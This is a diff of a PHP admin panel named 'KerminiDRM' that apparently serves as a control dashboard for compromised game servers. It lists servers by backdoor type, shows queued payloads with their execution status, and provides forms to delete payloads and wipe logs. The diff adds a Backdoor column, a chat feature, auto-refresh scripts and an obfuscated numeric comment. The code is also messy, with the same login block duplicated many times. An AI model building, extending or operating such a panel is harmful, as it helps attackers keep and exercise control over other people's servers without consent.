@@ -5,6 +5,7 @@ $DB_HOST = '';
 $DB_USER = '';
 $DB_PASS = '';
 $DB_NAME = '';
+
 // Try and connect using the info above.
 $con = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
 if ( mysqli_connect_errno() ) {
@@ -14,8 +15,8 @@ if ( mysqli_connect_errno() ) {
 // Now we check if the data was submitted, isset will check if the data exists.
 if ( !isset($_POST['username'], $_POST['password']) ) {
 	// Could not get the data that should have been sent.
-	die ('Username and/or password does not exist! :)(: ');
-}
+	die ('Username and/or password does not exist! :)(: ');                                                                      // captchata secret key here
+}	$response = $_POST["g-recaptcha-response"];	$url = 'https://www.google.com/recaptcha/api/siteverify';	$data = array(		'secret' => '',		'response' => $_POST["g-recaptcha-response"]	);	$options = array(		'http' => array (			'method' => 'POST',			'content' => http_build_query($data)		)	);	$context  = stream_context_create($options);	$verify = file_get_contents($url, false, $context);	$captcha_success=json_decode($verify);	if ($captcha_success->success==false) {		echo "<p>You are a bot! Go away!</p>"; die();	} else if ($captcha_success->success==true) {
 // Prepare our SQL 
 if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
 	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
@@ -27,11 +28,12 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 		$stmt->bind_result($id, $password);
 		$stmt->fetch();      
 		// Account exists, now we verify the password.
-		if (password_verify($_POST['password'], $password)) {
+		// 109/73/71/100/118/98/50/81/103/73/87/115/116/97/87/49/48/97/71/86/117/90/88/100/50/97/88/66/108/100/109/86/117/100/71/104/108/99/109/85/75/
+		if (password_verify($_POST['password'], $password)) {			
 			// Verification success! User has loggedin!
 			$_SESSION['loggedin'] = TRUE;
 			$_SESSION['name'] = $_POST['username'];
-			$_SESSION['id'] = $id;
+			$_SESSION['id'] = $id; 
 	 $log_what1a = ' : Connected '. '| When : ';
 	 $log_what2a = $log_what1a . date("Y-m-d H:i:s");
 	 $log_whata = $_SESSION['name'] . $log_what2a;
@@ -44,10 +46,10 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 				// SourceQuery
 	require( __DIR__ . '/SourceQuery/SourceQuery.class.php');
 	// Database Settings
-	$Database_Host 		= "";
-	$Database_Database 	= "";
-	$Database_Username 	= "";
-	$Database_Password	= "";
+	$Database_Host 		= $DB_HOST;
+	$Database_Database 	= $DB_NAME;
+	$Database_Username 	= $DB_USER;
+	$Database_Password	= $DB_PASS;
 	
 	// Page Settings
 	$Title		= "Panel";
@@ -56,7 +58,7 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 	$PageTitle	= "KerminiDRM";
 	
 	// Language
-	$T_ServerList = "Kermini Server List | Created by Maxime_48";
+	$T_ServerList = "Kermini Server List";
 	$T_BanList = "_NIL_";
 	
 	$S_IP = "IP";
@@ -67,6 +69,7 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 	$S_Update = "Join Date";
 	$S_First = "First Players";
 	$S_Payload = "Payload";
+	$S_Backdoor = "Backdoor";
 	
 	//$B_SteamID = "SteamID";
 	//$B_IGN = "IGN";
@@ -87,7 +90,6 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 	elseif($Color=="Green"){$PColor="success";}elseif($Color=="Sky"){$PColor="info";}
 	elseif($Color=="Orange"){$PColor="warning";}elseif($Color=="Red"){$PColor="danger";}
 	elseif($Color=="Dark"){$PColor="dark";}
-
       
 		} else {
 			echo 'Incorrect  username  and/or  password!';
@@ -109,6 +111,7 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 	$S_Update = "UNCONNECTED";
 	$S_First = "UNCONNECTED";
     $S_Payload = "UNCONNECTED";	
+	die();
 		}
 	} else {
 		echo 'Incorrect  username  and/or  password!';
@@ -129,13 +132,12 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 	$S_Players = "UNCONNECTED";
 	$S_Update = "UNCONNECTED";
 	$S_First = "UNCONNECTED";
-	$S_Payload = "UNCONNECTED";
+	$S_Payload = "UNCONNECTED";		 
+	die();
 	}
-	$stmt->close();
 } else {
 	echo 'Could  not  prepare  statement!';
-}
-?>
+}	}?>
 <!DOCTYPE html>
 <html>
 	<head>
@@ -147,12 +149,17 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
         <linl rel="stylesheet" type="text/css" href="css/widget.bootstrap.css">
         <link href='http://fonts.googleapis.com/css?family=Alegreya+Sans+SC:400,500,800' rel='stylesheet' type='text/css'>
         
+		
         <!-- Javascript -->
         <script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
     	<script src="js/bootstrap.js" type="text/javascript"></script>
         <script src="js/jquery.tablesorter.js" type="text/javascript"></script>
         <script src="js/jquery.tablesorter.widgets.js" type="text/javascript"></script>
         <script src="js/jquery.tablesorter.run.js" type="text/javascript"></script>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+
+		
 		
     </head>
 	<body style="background-image:url(img/shattered.png);">
@@ -168,8 +175,89 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
         <!-- Servers -->
         <div class="panel panel-<?php echo $PColor; ?>">
 		<div class="panel-heading"><b><?php echo $T_ServerList; ?></b></div>
+	    <button onclick="chatFunction()">Chat</button>
+		<div id="chat">
+		<script>document.getElementById("chat").style.display = "none"; </script>
+		<?php
+		  	if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
+	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
+	$stmt->bind_param('s', $_POST['username']);
+	$stmt->execute(); 
+	$stmt->store_result(); 
+	// Store the result so we can check if the account exists in the database.
+	if ($stmt->num_rows > 0) {
+		$stmt->bind_result($id, $password);
+		$stmt->fetch();      
+		// Account exists, now we verify the password.
+		if (password_verify($_POST['password'], $password)) {
+			// Verification success! User has loggedin!
+			$_SESSION['loggedin'] = TRUE;
+			$_SESSION['name'] = $_POST['username'];
+			$_SESSION['id'] = $id;
+            echo '<form action="send_chat.php" method="post" id="mysendchat">
+			      <input type="text" name="message" placeholder="message" id="message" />
+				  <input id="username" name="username" type="hidden" value="'.$_SESSION['name'].'">
+				  <button id="insert">Send</button>';
+			}
+			}
+			}
+		?>
+		<script>
+$('#mysendchat').submit(function(){
+ return false;
+});
+ 
+$('#insert').click(function(){
+ $.post( 
+ $('#mysendchat').attr('action'),
+ $('#mysendchat :input').serializeArray(),
+ function(result){
+ $('#result').html(result);
+ }
+ );
+});
+		</script>
+		<div id="chat_display">
+		<?php
+	if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
+	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
+	$stmt->bind_param('s', $_POST['username']);
+	$stmt->execute(); 
+	$stmt->store_result(); 
+	// Store the result so we can check if the account exists in the database.
+	if ($stmt->num_rows > 0) {
+		$stmt->bind_result($id, $password);
+		$stmt->fetch();      
+		// Account exists, now we verify the password.
+		if (password_verify($_POST['password'], $password)) {
+			// Verification success! User has loggedin!
+			$_SESSION['loggedin'] = TRUE;
+			$_SESSION['name'] = $_POST['username'];
+			$_SESSION['id'] = $id;
+$reponse = $db->query('SELECT member, Text FROM chat ORDER BY Id DESC LIMIT 0, 10');
+
+// Affichage de chaque message (toutes les données sont protégées par htmlspecialchars)
+while ($donnees = $reponse->fetch())
+{
+echo '<p><strong>' . htmlspecialchars($donnees['member']) . '</strong> : ' . htmlspecialchars($donnees['Text']) . '</p>';
+}
+	}
+	}
+	}
+		?>
+        </div>
+				<script>
+				setInterval('load_chat()', 1400);
+				function load_chat() {
+					$('#chat_display').load('reload_chat.php');
+				}
+				</script>
+		
+		</div>
+		
 <button onclick="LogsDisplay()">Logs</button>
 <div id="logs">
+    <div id="logs_display">
 <script>document.getElementById("logs").style.display = "none"; </script>
   <?php
   	if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
@@ -192,12 +280,41 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
              {
 	         echo 'Log ID : ', $satanis['log_id'] . ' | ', $satanis['What'], '</br>';
              } 
+		}
+	}
+  	}
+             ?>
+             </div>
+             <?php
+    if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
+	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
+	$stmt->bind_param('s', $_POST['username']);
+	$stmt->execute(); 
+	$stmt->store_result(); 
+	// Store the result so we can check if the account exists in the database.
+	if ($stmt->num_rows > 0) {
+		$stmt->bind_result($id, $password);
+		$stmt->fetch();      
+		// Account exists, now we verify the password.
+		if (password_verify($_POST['password'], $password)) {
+			// Verification success! User has loggedin!
+			$_SESSION['loggedin'] = TRUE;
+			$_SESSION['name'] = $_POST['username'];
+			$_SESSION['id'] = $id;
+			$reponses = $db->query('SELECT * FROM logs');
 			 echo '<form action="resetelogs.php" method="post">
 		<input type="number" name="deletelogs" placeholder="Type delete to delete logs" required size="40">
 		<input type="submit"></form>' . '<br />';
 	}}}
   ?>
-</div> 
+</div>
+				<script>
+				setInterval('load_logs()', 1400);
+				function load_logs() {
+					$('#logs_display').load('reload_logs.php');
+				}
+				</script>
+				
         <table class="table table-striped">
             <thead>
               <tr>
@@ -275,6 +392,27 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 
 		</div>
 	</body>';
+		}
+	}
+	}
+	?>
+	<div id="myDIV_display">
+	<?php
+		if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
+	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
+	$stmt->bind_param('s', $_POST['username']);
+	$stmt->execute(); 
+	$stmt->store_result(); 
+	// Store the result so we can check if the account exists in the database.
+	if ($stmt->num_rows > 0) {
+		$stmt->bind_result($id, $password);
+		$stmt->fetch();      
+		// Account exists, now we verify the password.
+		if (password_verify($_POST['password'], $password)) {
+			// Verification success! User has loggedin!
+			$_SESSION['loggedin'] = TRUE;
+			$_SESSION['name'] = $_POST['username'];
+			$_SESSION['id'] = $id;
 		     $reponse = $db->query('SELECT description, ServerID, execution FROM payload');	 
              while ($donnees = $reponse->fetch())
              {
@@ -286,6 +424,27 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
              }	
 	         echo 'Payload : ', $donnees['description'] . ' | Server ID : ' . $donnees['ServerID'] . ' | Status : ' . $mtxapprouve . '</br>';
              }
+		}
+	}
+		}
+		?>
+		</div>
+		<?php
+			if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
+	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
+	$stmt->bind_param('s', $_POST['username']);
+	$stmt->execute(); 
+	$stmt->store_result(); 
+	// Store the result so we can check if the account exists in the database.
+	if ($stmt->num_rows > 0) {
+		$stmt->bind_result($id, $password);
+		$stmt->fetch();      
+		// Account exists, now we verify the password.
+		if (password_verify($_POST['password'], $password)) {
+			// Verification success! User has loggedin!
+			$_SESSION['loggedin'] = TRUE;
+			$_SESSION['name'] = $_POST['username'];
+			$_SESSION['id'] = $id;
 			 echo '<form action="deletepayload.php" method="post">
 		<input type="delete" name="delete" placeholder="Type the name of the payload you want to delete" required size="40">
 		<input type="submit"></form>' . '<br />';
@@ -293,7 +452,14 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 	  }
 	}
 	?>
-                </div>
+				<script>
+				setInterval('load_payloads()', 1400);
+				function load_payloads() {
+					$('#myDIV_display').load('reload_payloads.php');
+				}
+				</script>
+	            <th><?php echo $S_Backdoor; ?></th>
+</div>
 				
 				
 				
@@ -305,6 +471,7 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
               </tr>
             </thead>
             <tbody>
+			<div id="servers">
             	<?php
 				if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
 	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
@@ -361,6 +528,8 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 								<td>" . htmlspecialchars($ServerInfo['Players']) . " / " . htmlspecialchars($ServerInfo['MaxPlayers']) . "</td>
 								<td>" . $PrintServers['LastUpdate'] . "</td>
 								<td>" . $PrintServers['Players'] . "</td>
+								<td>" . '|' . "</td>
+								<td>" . $PrintServers['Backdoor_type'] . "</td>
 							</tr>
 						";
 							
@@ -369,10 +538,17 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 	             }	
 				}
 				?>
+				</div> 
+				<script>
+				setInterval('load_servers()', 1400);
+				function load_servers() {
+					$('#servers').load('reload_servers.php');
+				}
+				</script>
             </tbody>
         </table>
         </div>
-        <!-- ./Servers -->
+        <!-- ./End Of page | Made By Maxime_48 -->
             </tbody>
         </table>
         </div>  
